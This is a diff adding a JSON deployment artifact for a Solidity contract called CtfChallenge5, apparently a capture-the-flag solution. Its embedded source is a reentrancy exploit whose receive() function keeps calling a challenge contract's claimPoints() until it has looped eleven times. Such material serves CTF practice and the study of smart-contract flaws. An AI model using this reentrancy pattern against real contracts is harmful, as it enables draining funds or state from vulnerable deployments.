@@ -1,0 +1,148 @@
+{
+  "address": "0x4440602bf40a6f3Cce8991127cE2613501F859eb",
+  "abi": [
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "_challengeAddress",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "nonpayable",
+      "type": "constructor"
+    },
+    {
+      "anonymous": false,
+      "inputs": [],
+      "name": "fallbackCalled",
+      "type": "event"
+    },
+    {
+      "anonymous": false,
+      "inputs": [],
+      "name": "recieveCalled",
+      "type": "event"
+    },
+    {
+      "stateMutability": "nonpayable",
+      "type": "fallback"
+    },
+    {
+      "inputs": [],
+      "name": "TARGET",
+      "outputs": [
+        {
+          "internalType": "uint256",
+          "name": "",
+          "type": "uint256"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "callCount",
+      "outputs": [
+        {
+          "internalType": "uint256",
+          "name": "",
+          "type": "uint256"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "challenge",
+      "outputs": [
+        {
+          "internalType": "contract IChallenge5",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "startClaim",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "stateMutability": "payable",
+      "type": "receive"
+    }
+  ],
+  "transactionHash": "0xa326a10dab885b0aa3e76a21582b5eea8c6f7761929dca33add26d4d7572fa23",
+  "receipt": {
+    "to": null,
+    "from": "0x0b99DE6969399246fF1901432d7fe63DAC17bF8C",
+    "contractAddress": "0x4440602bf40a6f3Cce8991127cE2613501F859eb",
+    "transactionIndex": 11,
+    "gasUsed": "288489",
+    "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+    "blockHash": "0xb9d9566a9e64bac836a6e9173663938a20ed00653443c3e298c4f7c43b210b98",
+    "transactionHash": "0xa326a10dab885b0aa3e76a21582b5eea8c6f7761929dca33add26d4d7572fa23",
+    "logs": [],
+    "blockNumber": 141682410,
+    "cumulativeGasUsed": "3690952",
+    "status": 1,
+    "byzantium": true
+  },
+  "args": [
+    "0xB76AdFe9a791367A8fCBC2FDa44cB1a2c39D8F59"
+  ],
+  "numDeployments": 1,
+  "solcInputHash": "449ae3162a1bb47131d98fea911ee71f",
+  "metadata": "{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_challengeAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"fallbackCalled\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"recieveCalled\",\"type\":\"event\"},{\"stateMutability\":\"nonpayable\",\"type\":\"fallback\"},{\"inputs\":[],\"name\":\"TARGET\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"callCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"challenge\",\"outputs\":[{\"internalType\":\"contract IChallenge5\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startClaim\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/CtfChallenge5.sol\":\"CtfChallenge5\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/CtfChallenge5.sol\":{\"content\":\"// SPDX-License-Identifier: UNLICENSED\\npragma solidity ^0.8.28;\\n\\ncontract CtfChallenge5 {\\n    IChallenge5 public challenge;\\n    uint256 public callCount;\\n    uint256 public constant TARGET = 11;\\n\\n    event recieveCalled();\\n    event fallbackCalled();\\n\\n    constructor(address _challengeAddress) {\\n        challenge = IChallenge5(_challengeAddress);\\n    }\\n\\n    function startClaim() external {\\n        callCount = 0;\\n        challenge.claimPoints();\\n    }\\n\\n    receive() external payable {\\n        // emit recieveCalled();\\n        if (callCount < TARGET) {\\n            callCount++;\\n            challenge.claimPoints();\\n        }\\n    }\\n\\n    fallback() external {\\n        // emit fallbackCalled();       // if (callCount < TARGET) {\\n        //     callCount++;\\n        //     challenge.claimPoints();\\n        // } else if (callCount == TARGET) {\\n        //     callCount++;\\n        //     challenge.mintFlag();\\n        // }\\n    }\\n}\\n\\n\\ninterface IChallenge5 {\\n    function claimPoints() external;\\n    function mintFlag() external;\\n    function resetPoints() external;\\n}\",\"keccak256\":\"0x00fd37fbc9274f742fb67ce55d5671cb15f8c58fa207d26a00bdde719d09e3db\",\"license\":\"UNLICENSED\"}},\"version\":1}",
+  "bytecode": "0x608060405234801561001057600080fd5b506040516104df3803806104df833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b6103c8806101176000396000f3fe6080604052600436106100435760003560e01c80634b28f9a2146100fc578063cc1f2afa14610127578063d2ef739814610152578063ecbfc0771461017d576100ee565b366100ee57600b60015410156100ec576001600081548092919061006690610286565b919050555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166304d092c76040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100d357600080fd5b505af11580156100e7573d6000803e3d6000fd5b505050505b005b3480156100fa57600080fd5b005b34801561010857600080fd5b50610111610194565b60405161011e91906102dd565b60405180910390f35b34801561013357600080fd5b5061013c61019a565b60405161014991906102dd565b60405180910390f35b34801561015e57600080fd5b5061016761019f565b6040516101749190610377565b60405180910390f35b34801561018957600080fd5b506101926101c3565b005b60015481565b600b81565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600060018190555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166304d092c76040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561023357600080fd5b505af1158015610247573d6000803e3d6000fd5b50505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000819050919050565b60006102918261027c565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036102c3576102c261024d565b5b600182019050919050565b6102d78161027c565b82525050565b60006020820190506102f260008301846102ce565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061033d610338610333846102f8565b610318565b6102f8565b9050919050565b600061034f82610322565b9050919050565b600061036182610344565b9050919050565b61037181610356565b82525050565b600060208201905061038c6000830184610368565b9291505056fea264697066735822122076dc1d39e6fc4c5430e3265f240c0deb629dd90162a79f696cd9fa85f5c72d0564736f6c634300081c0033",
+  "deployedBytecode": "0x6080604052600436106100435760003560e01c80634b28f9a2146100fc578063cc1f2afa14610127578063d2ef739814610152578063ecbfc0771461017d576100ee565b366100ee57600b60015410156100ec576001600081548092919061006690610286565b919050555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166304d092c76040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100d357600080fd5b505af11580156100e7573d6000803e3d6000fd5b505050505b005b3480156100fa57600080fd5b005b34801561010857600080fd5b50610111610194565b60405161011e91906102dd565b60405180910390f35b34801561013357600080fd5b5061013c61019a565b60405161014991906102dd565b60405180910390f35b34801561015e57600080fd5b5061016761019f565b6040516101749190610377565b60405180910390f35b34801561018957600080fd5b506101926101c3565b005b60015481565b600b81565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600060018190555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166304d092c76040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561023357600080fd5b505af1158015610247573d6000803e3d6000fd5b50505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000819050919050565b60006102918261027c565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036102c3576102c261024d565b5b600182019050919050565b6102d78161027c565b82525050565b60006020820190506102f260008301846102ce565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061033d610338610333846102f8565b610318565b6102f8565b9050919050565b600061034f82610322565b9050919050565b600061036182610344565b9050919050565b61037181610356565b82525050565b600060208201905061038c6000830184610368565b9291505056fea264697066735822122076dc1d39e6fc4c5430e3265f240c0deb629dd90162a79f696cd9fa85f5c72d0564736f6c634300081c0033",
+  "devdoc": {
+    "kind": "dev",
+    "methods": {},
+    "version": 1
+  },
+  "userdoc": {
+    "kind": "user",
+    "methods": {},
+    "version": 1
+  },
+  "storageLayout": {
+    "storage": [
+      {
+        "astId": 4,
+        "contract": "contracts/CtfChallenge5.sol:CtfChallenge5",
+        "label": "challenge",
+        "offset": 0,
+        "slot": "0",
+        "type": "t_contract(IChallenge5)70"
+      },
+      {
+        "astId": 6,
+        "contract": "contracts/CtfChallenge5.sol:CtfChallenge5",
+        "label": "callCount",
+        "offset": 0,
+        "slot": "1",
+        "type": "t_uint256"
+      }
+    ],
+    "types": {
+      "t_contract(IChallenge5)70": {
+        "encoding": "inplace",
+        "label": "contract IChallenge5",
+        "numberOfBytes": "20"
+      },
+      "t_uint256": {
+        "encoding": "inplace",
+        "label": "uint256",
+        "numberOfBytes": "32"
+      }
+    }
+  }
+}
